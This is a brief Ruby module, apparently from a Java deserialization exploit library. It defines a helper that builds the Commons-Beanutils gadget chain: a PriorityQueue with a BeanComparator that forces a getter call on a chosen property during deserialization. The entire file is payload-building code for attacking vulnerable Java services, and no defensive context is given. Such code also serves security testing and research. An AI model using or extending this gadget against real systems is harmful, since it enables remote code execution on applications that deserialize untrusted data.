
require_relative '../serialize'

module Java
  module Serialize
    module Payloads
      module Beanutils
        def make_get_property(obj, property)
          revcomp = JavaObject.new('Ljava/util/Collections$ReverseComparator;', {})
          comp = JavaObject.new('Lorg/apache/commons/beanutils/BeanComparator;', 'comparator' => revcomp, 'property' => property)
          JavaObject.new('Ljava/util/PriorityQueue;', 'comparator' => comp, 'elements' => [obj, obj])
      end

        module_function :make_get_property
        end
    end
  end
end
